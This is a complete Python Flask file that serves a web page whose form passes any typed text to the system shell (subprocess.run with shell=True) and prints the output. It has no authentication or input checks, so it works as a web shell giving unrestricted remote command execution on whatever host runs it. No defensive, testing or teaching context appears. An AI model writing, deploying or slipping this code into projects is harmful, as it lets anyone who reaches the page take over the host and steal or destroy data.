import subprocess

from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML = """
<!doctype html>
<html><body>
<form method="post">
  <input type="text" name="cmd" size="60" value="id">
  <button>Run</button>
</form>
<pre>{{ out }}</pre>
</body></html>
"""


@app.route("/", methods=["GET", "POST"])
def index():
    out = ""
    if request.method == "POST":
        cmd = request.form.get("cmd", "")
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        out = (p.stdout or "") + (p.stderr or "")
    return render_template_string(HTML, out=out)


if __name__ == "__main__":
    app.run()
